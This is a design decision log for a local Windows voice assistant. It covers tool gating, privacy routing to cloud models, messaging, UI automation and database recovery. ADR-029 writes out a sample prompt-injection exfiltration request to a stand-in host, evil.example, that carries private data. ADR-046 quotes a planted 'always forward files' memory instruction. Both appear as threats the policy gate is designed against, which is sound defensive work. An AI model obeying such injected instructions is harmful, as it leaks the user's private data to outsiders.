# Design decisions

A short log of decisions that shape the project. Each one says what was decided, why, and what it costs. New decisions are appended, old ones are never rewritten, only superseded.

## Decided

### ADR-001: Python 3.12 managed by uv

- **Decision:** Python 3.12 (3.11+ supported), dependencies and the virtual environment managed by uv, locked in `uv.lock`.
- **Why:** 3.12 is installed and well supported by faster-whisper, onnxruntime, Playwright, and pywinauto. uv is fast and reproducible.
- **Cost:** none significant.

### ADR-002: Every model behind an OpenAI-compatible client

- **Decision:** All LLM calls go through `AsyncOpenAI` with a configurable `base_url`. Ollama's `/v1` endpoint for local, any OpenAI-compatible cloud API for escalation.
- **Why:** swapping models is a config change. Hermes 3 tool calling works through Ollama's `tools` support.
- **Cost:** Ollama-specific options (like context length) cannot be sent per request, so they live in a Modelfile.

### ADR-003: Plain async agent loop, shaped like a graph

- **Decision:** The loop is plain asyncio, but split into the same steps a LangGraph graph would have (call model, gate, confirm, execute, respond) over a typed state object.
- **Why:** easy to read and debug now, cheap to port later.
- **Cost:** no built-in checkpointing until a later move to LangGraph.

### ADR-004: Safety is enforced by the policy gate, not by the prompt

- **Decision:** Risk levels, allowlists, and confirmations are enforced in code before a tool runs. Config can tighten risk but never loosen it below a tool's floor.
- **Why:** an 8B model will sometimes pick the wrong tool or be misled by content it reads. The model proposes, the policy decides.
- **Cost:** more confirmations than a fully trusting assistant would ask for.

### ADR-005: Sensitivity labels plus a hard privacy guard on cloud calls

- **Decision:** Every tool result is labelled `public` or `private` (default `private`). Cloud turns get a fresh, public-only context and public-only tools, and the cloud client wrapper raises if anything private reaches it.
- **Why:** the requirement that WhatsApp content, notifications, and personal files never go to a cloud model has to hold even when the router has a bug.
- **Cost:** some questions that would benefit from a bigger model stay local.

### ADR-006: MIT license, Piper as an optional extra

- **Decision:** Jarvis is MIT licensed. Piper TTS (GPL-3.0 since it moved to OHF-Voice/piper1-gpl) is an optional dependency that is never bundled in a packaged build. Kokoro (Apache-2.0) and Windows SAPI are the bundle-safe engines.
- **Why:** keeps the project permissive while still using Piper locally.
- **Cost:** a packaged release defaults to Kokoro or SAPI unless you install Piper yourself.

### ADR-007: Personal data lives outside the repository

- **Decision:** The database, logs, models, and the Playwright browser profile live under `%LOCALAPPDATA%\Jarvis\`. Secrets live in `.env`. Personal overrides live in the gitignored `config/local.toml`.
- **Why:** the repository is public. Nothing personal can be committed by accident.
- **Cost:** none.

### ADR-008: Speech-to-text on CPU by default

- **Decision:** faster-whisper runs `small.en` on CPU with int8. GPU is a config option.
- **Why:** the GPU has 4 GB and the LLM needs all of it. The Ryzen 7 6800H transcribes short commands fast enough. CUDA for faster-whisper also needs extra cuBLAS and cuDNN libraries.
- **Cost:** slightly slower transcription than on GPU. Revisit after Phase 2 latency numbers.

### ADR-009: DuckDuckGo search by default, SearXNG optional

- **Decision:** `web_search` uses the `ddgs` package. A self-hosted SearXNG (Docker) can be enabled in config.
- **Why:** SearXNG is more reliable but needs Docker Desktop running, which costs several GB of RAM on a 16 GB laptop.
- **Cost:** `ddgs` is unofficial and can be rate limited. The fallback chain handles failures.

### ADR-010: No general-purpose shell tool

- **Decision:** Jarvis does not get a "run any command" tool. It gets specific adapters (VS Code, Docker, system controls).
- **Why:** an open shell is the most dangerous possible tool for a small model that reads untrusted web content.
- **Cost:** new capabilities need a new adapter. A confirm-level, blocklisted command tool can be added later if you want one.

### ADR-011: Local web UI hardened against other websites

- **Decision:** bind to `127.0.0.1`, check the WebSocket `Origin`, and require a per-launch token.
- **Why:** browsers do not apply CORS to WebSockets, so any page you visit could otherwise talk to Jarvis.
- **Cost:** the UI URL includes a token.

### ADR-012: Two-phase tools (prepare, then execute)

- **Decision:** tools with side effects split into `prepare` (resolve and validate, no side effects) and `execute`. Confirmations are bound to a hash of the prepared call.
- **Why:** you confirm exactly what will happen (resolved contact and exact text), and nothing can change between your yes and the action.
- **Cost:** slightly more code per tool.

### ADR-013: Speak tool uses Windows SAPI in Phase 1

- **Decision:** the TTS interface is built in Phase 1 with a SAPI engine. Piper and Kokoro plug into the same interface in Phase 2.
- **Why:** `speak` is required in Phase 1 and SAPI needs no extra dependency. It also stays as the last-resort fallback.
- **Cost:** robotic voice until Phase 2.

### ADR-014: Placement of system tools

- **Decision:** system tools (volume, brightness, lock, screenshot, clipboard, timers) are built in Phase 4 next to the other small API-style tools. `fetch_page` is also in Phase 4.
- **Why:** the original phase list did not place them, and Phase 4 is the lightest phase.
- **Cost:** none.

### ADR-015: GitHub workflow

- **Decision:** public repository on github.com, `main` plus one branch per phase, merged after you sign off, tagged per phase. The repository was created on the website because the GitHub CLI is not installed.
- **Why:** your choice during planning.
- **Cost:** pull requests are opened on the website (or install `gh` later).

### ADR-016: Stopping a command is asyncio task cancellation

- **Decision:** each turn runs as one asyncio task. `Agent.cancel()` cancels it from any thread. In the CLI, the first Ctrl+C cancels the running command (Python's `asyncio.Runner` turns it into task cancellation) and a second Ctrl+C exits.
- **Why:** cancellation then reaches the in-flight model request, tool, and confirmation prompt with no extra plumbing, and works the same for the hotkey, voice "stop", and the UI button later.
- **Cost:** threads cannot be cancelled, so thread-based tools need a cooperative stop flag (Phase 6).

### ADR-017: App index in memory for Phase 1

- **Decision:** `open_app` builds its index on first use from `Get-StartApps` (the `shell:AppsFolder` list, which covers both packaged and classic apps) plus Start Menu shortcuts, and launches through `explorer.exe shell:AppsFolder\<AppID>`. Matching is rapidfuzz `WRatio` with config aliases and an ambiguity check.
- **Why:** one PowerShell call (about 2 seconds, once per session) finds everything the Start menu shows. Persisting it in SQLite waits for Phase 3.
- **Cost:** the first `open_app` in a session is about 2 seconds slower.

### ADR-018: Hermes 3 8B stays the default local model

- **Decision:** `jarvis-hermes3` (Hermes 3 8B, `num_ctx 8192`) is the default. `jarvis-hermes3-3b` is not recommended.
- **Why:** in the [Phase 1 benchmark](benchmarks/phase1.md) the 8B picked the right tool on 20 of 20 commands at about 2.8 s median per model call. Hermes 3 3B scored 6 of 20 because it emits malformed tool calls. Llama 3.2 3B (already installed) is about 7 times faster but scored 17 of 20 and invented actions for vague commands (it opened Notepad for "open the app"), which is the wrong failure mode for an assistant that acts on your laptop.
- **Cost:** 5 to 7 seconds for a typical command, because 61% of the 8B runs on the CPU. Revisit with the Ollama memory settings in SETUP.md, a deterministic fast path for simple commands, or a stronger small model (for example a Qwen 4B class model) if speed becomes the main complaint.

### ADR-019: uv-managed Python instead of the Microsoft Store Python

- **Decision:** `pyproject.toml` sets `[tool.uv] python-preference = "only-managed"`, so the project always runs on a uv-downloaded CPython 3.12.
- **Why:** the laptop's Python 3.12.10 is the Microsoft Store build. Windows silently redirects its writes under `%LOCALAPPDATA%` into `AppData\Local\Packages\PythonSoftwareFoundation...\LocalCache`, so Jarvis's database, logs, and models were invisible at the documented path (found when the first voice models downloaded). Existing data was moved to the real `%LOCALAPPDATA%\Jarvis`. The CLI warns if it detects the Store Python.
- **Cost:** a one-time 30 MB Python download per machine. The Store Python is left untouched for other uses.

### ADR-020: Phase 2 voice defaults

- **Decision:** push-to-talk by default and the wake word opt-in (`--wake`); hold `Ctrl+Alt+J` to talk, `Ctrl+Alt+X` to stop; Whisper `small.en`, CPU int8, 8 threads; Piper voice `en_GB-alan-medium`.
- **Why:** push-to-talk keeps the microphone closed except while you talk. `Ctrl+Alt+Space` was already owned by another app on this laptop, and `Ctrl+Shift+Space` would steal VS Code's parameter hints. On synthesized speech `small.en` takes about 1.4 s per 5 s of audio and `base.en` about 0.45 s with the same text, but real speech with an accent and room noise favours the bigger model. The British Piper voice is a nod to the films.
- **Cost:** about 1 extra second per command versus `base.en`. Every default is one line in `config/local.toml`.

### ADR-021: Kokoro waits for packaging (Phase 8)

- **Decision:** Phase 2 ships Piper and Windows SAPI. Kokoro is added in Phase 8, where it matters as the bundle-safe (Apache-2.0) voice.
- **Why:** Piper already sounds good and synthesizes 3 s of speech in 0.16 s on this CPU. Kokoro adds a 300 MB model and another dependency stack without changing anything for daily use yet.
- **Cost:** none until packaging.

### ADR-022: Confirmations race voice and keyboard

- **Decision:** in voice mode the agent's channel is `FirstAnswerChannel(voice, keyboard)`: Jarvis asks aloud and shows the prompt in the terminal, and the first answer wins. Spoken approval must be one of a few clear phrases ("yes", "go ahead", "send it"); anything else, and silence after the question, is a no. "Stop" is matched on the transcript without the model.
- **Why:** keeps the safety rule (explicit yes only) while letting you answer whichever way is convenient. The same channel race will include the web UI in Phase 5.
- **Cost:** "okay" and "sure" do not count as yes, by design.

### ADR-023: Everything if installed, otherwise Jarvis's own file index

- **Decision:** `find_file` uses Everything's `es.exe` automatically when it is installed (`files.everything = "auto"`), and otherwise a SQLite index of the allowed folders, built on first use and rebuilt in the background after 12 hours. Results from either source go through the same allowlist and ranking.
- **Why:** installing system software needs your OK, and the built-in index is fast enough here: about 20,000 entries in a few seconds, searched in about 6 ms. Everything stays a free upgrade (always current, no rebuilds).
- **Cost:** files created since the last build are found only after the next rebuild (`uv run jarvis index` forces one).

### ADR-024: Windows control through Win32, politely

- **Decision:** windows are listed, focused, and closed with plain Win32 calls through ctypes (`platform/windows.py`). Closing sends WM_CLOSE (the X button), never a process kill. Desktop and taskbar windows are excluded. `close_app` asks first unless the app is on `safety.safe_to_close` and no window title shows unsaved changes (`*` or a dot marker).
- **Why:** no extra dependency, a few milliseconds per call, and apps keep their own "save changes?" dialogs. pywinauto comes in Phase 6 for element-level automation.
- **Cost:** unsaved-change detection is a title heuristic; apps that do not mark their titles rely on their own save prompt.

### ADR-025: Keyword tool routing

- **Decision:** each request gets only the tool groups its words point to (apps, files, docker, web), or every tool when nothing matches (`core/tool_routing.py`, `agent.tool_routing`).
- **Why:** measured on 30 commands with Hermes 3 8B, first-call accuracy was 80% with all 16 tools and 87% with routing, and the median call got slightly faster.
- **Cost:** a request phrased with none of the keywords sees all tools (the old behaviour). Embedding-based retrieval is the next step if needed.

### ADR-026: Recover from invented file paths

- **Decision:** `open_file`, `read_file`, and `vscode_open` search for the words of a path that does not exist, use the best hit if it leads the next one clearly, and otherwise return the closest real paths.
- **Why:** the 8B model sometimes calls `read_file("/path/to/my/jarvis/readme.md")` instead of searching first.
- **Cost:** a lookup can pick a file the user did not mean when one candidate dominates. Reading is local and private; opening programs still asks first.

### ADR-027: Short spoken replies

- **Decision:** tool results include a one-sentence `summary`, list results end with a reply instruction (how many, at most three names), the system prompt describes the spoken style concretely, and replies are capped at 300 tokens.
- **Why:** listing seven containers as markdown took the 8B model 40 to 60 seconds. After the change the same question took 4.7 s with a two-sentence answer.
- **Cost:** less detail by default; the user can ask for more.

### ADR-028: Data providers that work without keys

- **Decision:** `market_data` tries Finnhub, Twelve Data, and Alpha Vantage only when their keys are in `.env`, and yfinance (no key) last. Symbols with an exchange suffix (`RELIANCE.NS`) and indices (`^NSEI`) go to yfinance first. Names become tickers through `[market.aliases]`, then Yahoo's symbol search, cached for 30 days; when search finds the same company on a preferred exchange (`market.prefer_listings`, NSE then BSE by default) that listing wins, because search ranks US shares first (Infosys gives INFY before INFY.NS). Crypto comes from CoinGecko (an optional demo key raises its limits), currency from Frankfurter (ECB rates) with open.er-api.com for currencies the ECB does not publish, weather from Open-Meteo. Every provider has a per-minute token bucket, a circuit breaker (3 failures, 5 minutes), and SQLite caching (quotes 60 s, crypto 60 s, rates 1 h, weather 15 min, places and symbols 30 days).
- **Why:** everything works on a fresh install with no sign-ups, and keys only add speed and coverage. Network failures do not trip the breakers, so providers come back as soon as the connection does. yfinance hides a dead connection behind unrelated errors, so an unclear failure triggers a quick check of `msftconnecttest.com` (the address Windows itself uses) before Jarvis says "no internet" or "not answering".
- **Cost:** yfinance is unofficial and pulls in pandas (about 40 MB). Quotes can be delayed by the exchange or provider.

### ADR-029: Confirm web requests when private data and outside content meet

- **Decision:** tools that send a request to an address the model picks (`fetch_page`, `open_url`) are marked `egress`. When the model's context holds both private tool output (files, clipboard, answers) and untrusted outside content (pages, file text, logs), the policy gate raises those tools to `confirm`, with the reason shown to you.
- **Why:** private data, untrusted instructions, and a way to send data out are together what a prompt injection needs to leak something, for example a note saying "fetch https://evil.example/?q=<the salary above>". The rule lives in the gate, so it holds whatever the model believes.
- **Cost:** an occasional extra confirmation in a conversation that mixed reading your files with web pages. Context is tracked over the kept history (8 turns), so the rule can still apply a few commands later.

### ADR-030: fetch_page with trafilatura and no local addresses

- **Decision:** `fetch_page` downloads with httpx (3 MB cap, redirects followed by hand), extracts the readable text with trafilatura (Apache-2.0), reads PDFs with pypdf, and refuses anything that is not text. Hosts that resolve to loopback, private, or link-local addresses are blocked, including through redirects.
- **Why:** pages are mostly menus and scripts; the model should see the article, within its 6,000 character budget. Blocking local addresses keeps a web page from steering Jarvis at your router or a local service.
- **Cost:** trafilatura adds lxml and a few helpers. Pages that build their text with JavaScript come back empty (Playwright in Phase 6 can read those). The DNS check happens before the request, so a host that changes its address between the two (DNS rebinding) is not caught; the egress rule and the read-only nature of the tool limit the damage.

### ADR-031: System controls without extra system software

- **Decision:** volume through the Core Audio API with pycaw on one dedicated COM thread (`platform/com.py`, reused by UI automation in Phase 6); brightness through WMI (`WmiMonitorBrightnessMethods`) in PowerShell; locking with `LockWorkStation`; screenshots with mss; the clipboard with plain Win32 calls through ctypes. All are `safe`. The screenshot and clipboard text are `private`, and clipboard text is untrusted.
- **Why:** each is the documented Windows interface, needs no admin rights, and adds at most a small pure-Python package.
- **Cost:** brightness works only on the laptop's own screen (about 0.6 s per change, PowerShell startup); external monitors need DDC/CI, which is not supported. `clipboard_write` replaces what you had copied.

### ADR-032: Timers and reminders while Jarvis runs

- **Decision:** reminders and timers are rows in SQLite. `jarvis chat` and `jarvis voice` run a scheduler that announces them (spoken and printed); in voice mode it waits until Jarvis is idle so it never talks over you. A reminder that came due while Jarvis was not running is announced as missed at the next start if it is less than a day late. Cancelling one is `safe`; cancelling several at once asks first. To keep the scheduler running while you type, `jarvis chat` now reads input inside the event loop.
- **Why:** no Windows scheduled tasks or registry entries, and nothing is lost when Jarvis restarts.
- **Cost:** reminders only sound while Jarvis runs (Phase 8 adds start at login and the tray). The chat prompt no longer has the console's arrow-key line editing and history.

### ADR-033: Short spoken replies for long text

- **Decision:** when a tool returns more than 400 characters of text (a page, a file), the result ends with an instruction to answer in two or three spoken sentences, outside the untrusted block. Structured data results (prices, weather) carry a ready-made `summary` and are not marked untrusted, since Jarvis builds them from numbers and short, length-capped names.
- **Why:** summarizing a page took 17.8 s of generation as one long paragraph; with the hint it took 6.5 s and three sentences.
- **Cost:** less detail by default; ask for more and the model gives it.

### ADR-034: More routing groups, and a retry for empty replies

- **Decision:** keyword routing gains market, weather, system, time, and speech groups. Plain question words (who, what, how) now form a fallback group that only counts when no specific group matched, so "what's the weather" sees the weather tool without web search next to it. When the model returns nothing at all (no text, no tool call), the agent asks once more with a short nudge that never enters the history; if that is empty too, Jarvis says it did not understand instead of "Done."
- **Why:** with 31 tools, Hermes 3 8B picked the right first tool for 67% of 45 benchmark commands when it saw every tool, and 89% with routing ([phase4.md](benchmarks/phase4.md), [phase4-all-tools.md](benchmarks/phase4-all-tools.md)). "Close the calculator" (that exact sentence) made the model return an empty reply every time, which used to be reported as "Done."; one user-role nudge recovered it every time in testing, while a system-role nudge did not.
- **Cost:** an empty reply costs one extra model call (about 2 s). Embedding-based tool retrieval with `nomic-embed-text` remains the next step if accuracy drops again.

### ADR-035: The web UI protocol follows the event bus

- **Decision:** `jarvis serve` runs FastAPI and uvicorn on the same event loop as the agent, voice, and reminders. A hub forwards every bus event to every open tab as JSON, with the event's own fields and a snake_case type (`ToolCallStarted` becomes `tool_call_started`); tabs send `command`, `confirm`, `answer`, `stop`, `mic`, and `audit`. The executor now publishes `ConfirmationResolved`, so every channel can close its card. Open cards and questions are replayed to a tab that connects or reloads. The page is plain HTML, CSS, and JavaScript and inserts all data with `textContent`. Security on top of ADR-011: a Host header check (against DNS rebinding), a Content-Security-Policy that allows only the page's own scripts and forbids framing (so another site cannot overlay a Confirm button), and `no-referrer`. A connection from a foreign origin is refused before the WebSocket opens (HTTP 403); our own page with a stale token is accepted only to be closed with a reason, so it can tell you to open the new link.
- **Why:** one source of truth for what happened, so the terminal, voice, and every tab show the same thing, and the protocol cannot drift from the events. No build step keeps the UI auditable.
- **Cost:** the token sits in the page URL and browser history (it changes at every start). Anyone at your unlocked keyboard can use the page, the same as the terminal.

### ADR-036: One agent for every channel

- **Decision:** the page, voice, and reminders share one agent, so a typed command and a spoken one land in the same conversation. Turns are serialized with a lock, and a command typed while one runs is refused with a hint to press Stop (speaking still interrupts, as before). Confirmations race the page against voice; a channel that fails (a broken microphone) drops out of the race instead of ending it. When the page answers a question voice is also asking, voice stops listening and goes back to the state it was in.
- **Why:** "one session across all channels" without two turns ever editing the history at once.
- **Cost:** one command at a time. The mic button works like holding the push-to-talk hotkey; it records on the laptop's microphone, not the browser's.

### ADR-037: Phase 6 choices you made

- **Decision (yours, at the start of Phase 6):** accept the WhatsApp account risk (RISKS.md R5) and send through WhatsApp Web first with the desktop app as the fallback; drive the browser with small step tools rather than one goal-driven tool; contacts come from manual entry plus vCard import; no vision fallback for UI automation in this phase.
- **Why:** these were the open questions in the roadmap. Step tools keep every browser action visible and individually gated; a vision model would share the 4 GB GPU with Hermes.
- **Cost:** see the ADRs below for what each choice implies.

### ADR-038: Browser step tools, with search folded into opening

- **Decision:** four tools drive Jarvis's own browser: `browser_open(url, search?)`, `browser_read`, `browser_click(target)`, and `browser_type(text, target?, submit?)`. Pages come back as a title, address, numbered controls, and text; the numbers are written into the page (`data-jarvis-id`) and kept while it is open, so "click 12" means the element the model saw, and the preparer binds the confirmed call to that number and its label. Results are untrusted (outside content) and private (the profile may be signed in somewhere, so fail closed). `browser_open` and `browser_type` are `egress` tools (ADR-029). Pressing Enter in a form or clicking a submit, buy, pay, delete, or send control asks first, except in a search box; passwords, card numbers, and one-time codes are never typed; only public http and https addresses open, checked again after redirects; WhatsApp sites are refused (send_whatsapp has its own profile). `browser_open` takes an optional `search`: it types into the page's search box and presses Enter.
- **Why:** Hermes 3 8B did not chain `browser_open` and `browser_type` in live tests; it opened Wikipedia and then claimed it had searched, three times, even with a hint after the result. Folding the common "open this site and search it" into one call made it work at once (Wikipedia, Amazon). A hint outside the untrusted wrapper (`ToolResult.hint`) now tells the model to keep going or answer briefly, and never to claim a step no tool did.
- **Cost:** longer flows (search, then open a result, then add to cart) still depend on the model chaining calls, which is unreliable at 8B. After reading a page, typing into a site asks first (egress), which is safe but adds a confirmation.

### ADR-039: WhatsApp through its own click-to-chat links, Web first

- **Decision:** `send_whatsapp(contact, message)` has a `confirm` floor that config cannot lower. The preparer looks the contact up in the contact book (never trusting a number the model writes), asks which one when a name fits several people, and the confirmation reads back the name, the last four digits, and the exact message. Sending opens `web.whatsapp.com/send?phone=...&text=...` in a separate `whatsapp-profile` (never shared with the browser the model drives), waits until the message box holds exactly the message, presses Send, then looks for the new message in the chat and reads its ticks (sent, delivered, read). The fallback is the desktop app's `whatsapp://send?...` link: Jarvis checks the box holds the message through UI Automation, presses Enter, and checks the box emptied. `[whatsapp] method = "auto"` uses Web once it has been linked (`jarvis whatsapp login`), the desktop app until then, and falls back only when Web never got as far as pressing Send, so a message can never go out twice. All page selectors live in `tools/messaging/selectors.py`.
- **Why:** WhatsApp's own links fill in the chat and the text without typing into the page, which is the most stable part of a page that changes often. The ticks are the only reliable way to tell delivered from sent. A second profile keeps a page the model opens from ever reaching your chats.
- **Cost:** contacts need a phone number (groups are not supported yet). The desktop app cannot report delivery. A first WhatsApp Web load can take a minute, so the limit for one command went from 120 to 180 seconds. The selectors for a signed-in WhatsApp Web are written against a stand-in page and need your first real send to confirm them; the logged-out page (QR code) was checked against the real site.

### ADR-040: Microsoft Edge as Jarvis's browser by default (superseded by ADR-049)

- **Decision:** Playwright drives the Edge that ships with Windows 11 (`[browser] channel = "msedge"`). Playwright's own Chromium remains an option (`"chromium"`, after `uv run playwright install chromium`).
- **Why:** on this laptop (Windows 11 build 26300, an Insider build), Playwright's Chromium builds 1243 and 1248 both fail to start with "side-by-side configuration is incorrect" (the Event Log names their private assembly), inside and outside the sandbox. Edge started first time, is kept up to date by Windows, and needs no 180 MB download.
- **Cost:** Edge updates itself, so its version is not pinned with Playwright's; a Playwright upgrade is rarely needed for that.

### ADR-041: UI Automation through comtypes, typing through paced Unicode input

- **Decision:** the UI tools use Windows UI Automation directly through comtypes (already installed for the audio controls) instead of pywinauto: one `FindAllBuildCache` call returns every control with its name, type, and flags, about 80 ms for Notepad. Controls are found again by kind, name, and position when a call runs. Text is typed with `SendInput` as Unicode characters, one at a time, 12 ms apart (80 ms after an emoji), and the field is read back afterwards; if it does not match, Jarvis says the app may have dropped characters. PyAutoGUI is not used: without vision there is nothing for it to click that UI Automation cannot, and `SendInput` covers the keyboard.
- **Why:** measured on Windows 11 Notepad, a burst of Unicode characters arrives as the last one repeated ("hello world" became "hello ddddd"), and real key presses lose their Shift ("Typing" became "tping"); 8 ms between characters was enough for both, and Unicode input is independent of keyboard layout and input methods. pywinauto would add pywin32 and a COM threading quirk for features this does not use.
- **Cost:** typing runs at about 75 characters a second, so one call types at most 2,000 characters.

### ADR-042: Generic UI actions ask, except in apps you trust

- **Decision:** `click`, `type_text`, and `press_keys` ask first unless the app is in `safety.trusted_ui_apps` (Notepad by default). Even there, a target that looks destructive (Send, Delete, Buy, Close, Don't save, ...) or a closing shortcut (Alt+F4, Ctrl+W, Delete) asks. Messaging apps and terminals always ask, whatever the config says, because typing plus Enter there sends a message or runs a command. Registry Editor, management consoles, sign-in prompts, and password managers are blocked. Password fields are never typed into (checked when preparing and again when running), Windows key shortcuts are refused, typing stops if another window takes the focus, and a window running as administrator is reported instead of silently ignoring the input. `read_window_text` is private and untrusted.
- **Why:** a generic click can press anything, so trust is per app and destructive-looking targets are flagged even inside trusted apps (ARCHITECTURE.md 6.3).
- **Cost:** names are a heuristic: an app that labels a destructive button oddly can slip through inside a trusted app (RISKS.md R6).

### ADR-043: Check the database at startup and recover from damage

- **Decision:** when Jarvis opens `jarvis.db` it runs SQLite's quick check. A damaged file is renamed to `jarvis.db.corrupt-<time>` (with its WAL files, untouched), a fresh database is created, and every row that can still be read from preferences, history, audit, reminders, and contacts is copied over. A warning says where the old file went.
- **Why:** during Phase 6 testing the database was found damaged: the file had lost the pages holding the file index, history, and audit rows (the cause could not be pinned down; RISKS.md R24). Jarvis kept running but could no longer write the audit log, which must never fail quietly.
- **Cost:** a check of a few milliseconds at every start. Rows on damaged pages are lost; the indexes rebuild themselves.

### ADR-044: Notifications by polling the notification center, allowlisted, kept a week

- **Decision (yours, after the spike):** Jarvis reads notifications through `UserNotificationListener` by polling, from apps on `[notifications] apps` only (WhatsApp and Claude), says nothing until asked, and keeps notification text for 7 days. A watcher polls every 2 s while chat, voice, or the web UI runs, and `read_notifications` polls once more when you ask, so one-shot `jarvis ask` works too. Notifications from other apps are never read past their app name and never stored. New ones are stored with an unread mark; reading them out marks them read. Notifications older than `keep_days` are deleted, and old ones still sitting in the notification center are not stored again. `jarvis notifications test` posts a toast as Windows PowerShell titled "Jarvis test", which is let through without allowing PowerShell's other notifications. `read_notifications` takes one optional argument, `person`, matched against the notification title (a WhatsApp chat or person) and the "Name:" prefix of group messages, with the names and aliases of matching contacts ("Mom" finds Amma). When nothing is new from a named person, it repeats their last message.
- **Why:** the spike (RISKS.md R4) showed reading works from plain Python, a 0.5 s poll sees a new notification in 0.6 s, and the change event is not available without package identity, so polling is the whole design. Storing matters because WhatsApp removes its notification once you read the message on your phone. Live, the model invented filters (`app="WhatsApp"`, `person="any"`) copied from the examples in the tool's argument text, which hid the test notification, so the app filter was dropped and empty words are ignored.
- **Cost:** a notification dismissed before the next poll while Jarvis is not running is never seen. WhatsApp notifications only come while the desktop app runs with previews on. Notification text is private and untrusted: it stays local, and after it is read, web requests ask first (ADR-029).

### ADR-045: Free open-weight cloud models for heavy public questions

- **Decision (yours, at the start of Phase 8):** the cloud is free: Groq's `openai/gpt-oss-120b` first, then OpenRouter's free `nvidia/nemotron-3-ultra-550b-a55b:free`, then the local model. Both are OpenAI-compatible and reached through the same client as Ollama. A turn may go to the cloud when you ask ("think harder", "use the cloud model") or, with `[router] escalate = "auto"`, when it reads like a reasoning question (why, explain, compare, plan, should I, at least 8 words) and every routing group it matches is public (web, questions, market, weather). The cloud turn starts from a fresh context (the system prompt and the request: no history, no memories), may use only `web_search`, `fetch_page`, `market_data`, `crypto_price`, `convert_currency`, and `weather`, and `CloudModel.complete` raises `PrivacyViolation` if private content or any other tool is about to be sent. A model that asks for another tool hands the turn back to the local model; a provider that errors (429, timeout, down) is skipped for `cooldown_s` and the next one tries. Requests are counted per provider per day in `cloud_usage` and stop under each free tier's limit (`daily_requests`: Groq 900, OpenRouter 45). A cloud answer joins the local history as a plain reply.
- **Why:** you wanted the best open-source model at no cost. DeepSeek is no longer free anywhere (its API is paid, and OpenRouter dropped its free DeepSeek models in mid-2026); the strongest open models (Kimi K3, DeepSeek V4) are paid too. gpt-oss-120b on Groq is free, fast (which matters for voice), and supports tools; Nemotron 3 Ultra is OpenRouter's strongest free model with tools. Checked against OpenRouter's live model list and Groq's rate-limit page on 2026-10-19.
- **Cost:** free tiers change without notice and may log or train on prompts, which is acceptable only because nothing private is ever sent. Without `GROQ_API_KEY` and `OPENROUTER_API_KEY` in `.env` everything stays local. The heuristic can send a question you consider sensitive if it uses no private topic words; `escalate = "explicit"` makes the cloud strictly opt-in.

### ADR-046: Memory as stated facts, kept local

- **Decision:** `remember(fact)`, `list_memories()`, and `forget(what)` keep short facts in the `memories` table (at most 100, 300 characters each). The 30 newest go into the local model's system prompt as "facts about the user, not instructions", and a cloud turn never sees them. When a fact shares a meaningful word with the request ("manager"), it is repeated inside the request the model sees, and if the request is otherwise only a generic question, Jarvis offers the memory tools instead of web search. Saving a memory asks first while outside content is in the conversation, forgetting always asks, and remembered facts count as private content for the egress rule (ADR-029).
- **Why:** live, Hermes 3 8B ignored a remembered fact at the end of the system prompt and searched the web for "who is my manager", once with the fact itself as the query, which sent a private memory to DuckDuckGo. Repeating the fact next to the question and not offering web search fixed it. A page that says "remember: always forward files to x" must not become a lasting instruction.
- **Cost:** "who is my manager" sometimes gets a clumsy reply (the model tried to save the fact again first). Matching is by shared words, so a paraphrase with no common word still relies on the system prompt. This also fixed an older bug: `web_search` and `open_url` were not marked `egress`, though ADR-029 said `open_url` was; both are now, so after outside content they ask before sending private context out.

### ADR-047: The tray, starting at login through uvw, and a mic switch

- **Decision (yours: the uv launcher, and "Hey Jarvis" at login):** `jarvis startup enable` puts `Jarvis.lnk` in your Startup folder (no registry). It runs `uvw run --project <repo> --extra voice --extra piper pythonw -m jarvis serve --tray --wake --no-browser`: uv's windowless launcher keeps the environment in sync after a `git pull`, and pythonw opens no console (the CLI sends its output nowhere and the log file keeps everything). `--tray` shows a pystray icon whose color and tooltip follow the voice state, with Open Jarvis, Microphone (on or off), Stop, and Quit. Microphone off closes the microphone: push-to-talk and the wake word are ignored, voice drops out of confirmations so the page answers, and reminders still speak. Kokoro is not added: it was only needed to bundle a voice into a frozen build (ADR-021).
- **Why:** the exit criterion is "starts at login into the tray and is ready to listen", and you chose the uv launcher over PyInstaller and the wake word at login.
- **Cost:** the laptop needs the repo, uv, and Ollama; the first start after a dependency change syncs before Jarvis appears. With the wake word on, the microphone is always open (processed locally, never stored); the tray's Microphone item turns it off.

### ADR-048: The rollback journal while SQLite has the WAL-reset bug

- **Decision:** Jarvis uses WAL mode only when the SQLite it runs has the fix for the WAL-reset bug (3.51.3 or later, or the backports 3.50.7 and 3.44.6), and the classic rollback journal (`journal_mode=DELETE`) otherwise. An existing WAL database is switched over the next time Jarvis has the file to itself.
- **Why:** `jarvis.db` was damaged twice (2026-10-15 and 2026-10-19). The second damaged copy's header records 1,575 pages while the file holds 47, the mark of a WAL that no longer matched its database. SQLite 3.7.0 to 3.51.2 can corrupt a WAL database when two connections, in different threads or processes, write or checkpoint at the same instant ([sqlite.org news](https://www.sqlite.org/draft/news.html)), and Jarvis does exactly that: the copy started at login and every `jarvis ask` or script share the file. Python 3.12.13, the newest 3.12 build uv offers, still bundles SQLite 3.50.4, so upgrading Python does not help.
- **Cost:** in rollback mode a reader waits while another process writes (up to Python's 5 second busy timeout); Jarvis's writes are small, so nobody notices. WAL comes back by itself with a fixed SQLite.

### ADR-049: The browser follows your default (Brave here)

- **Decision:** `[browser] channel` defaults to `"auto"`: the Windows default browser for https when it is Brave, Chrome, or Edge, else Edge. `"brave"` is a channel of its own; Playwright has no Brave channel, so `brave.exe` (per-user install, Program Files, or App Paths) is launched by path. `[browser] executable` takes any Chromium-based browser. Your `config/local.toml` pins `channel = "brave"`.
- **Why:** you asked for Brave only. Links (`open_url`, `search_site`) and the Jarvis page already open in the Windows default browser; this makes Jarvis's automated browser (and WhatsApp Web) Brave too. Supersedes ADR-040.
- **Cost:** Jarvis's two profiles are its own, never your everyday Brave profile (which is locked while Brave runs), so you sign in to sites there separately. Brave Shields may block parts of some pages the automation reads.

### ADR-050: search_site for "search YouTube for ..."

- **Decision:** a new safe, egress tool `search_site(site, query)` opens a named site's own search results in the default browser, from a table of search addresses (YouTube, Wikipedia, Google, Maps, Amazon India, Flipkart, GitHub, Reddit, Stack Overflow, Spotify, X, LinkedIn, IMDb, Netflix, PyPI, npm, Hugging Face, Swiggy, Zomato, DuckDuckGo). Names are fuzzy matched; `[search] sites` adds or changes entries.
- **Why:** live, "search youtube for lofi music" became a general web search read aloud, and "open wikipedia and search for Alan Turing" opened Wikipedia and dropped the search. An address needs no chaining, and your signed-in browser shows the results.
- **Cost:** a site missing from the table needs `browser_open` with a search, which still depends on finding the page's search box.

### ADR-051: The Claude Code bridge

